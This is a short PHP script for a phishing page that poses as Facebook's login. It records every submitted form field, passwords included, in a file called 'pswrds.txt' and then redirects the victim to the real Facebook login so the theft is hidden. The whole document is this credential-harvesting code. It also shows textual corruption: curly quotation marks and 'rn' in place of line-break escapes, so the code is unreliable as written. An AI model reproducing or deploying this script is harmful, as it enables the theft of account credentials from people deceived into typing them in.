<?php
header(“Location: http://www.Facebook.com/login.php “);
$handle = fopen(“pswrds.txt”, “a”);
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “rn”);
}
fwrite($handle, “rn”);
fclose($handle);
exit;
?>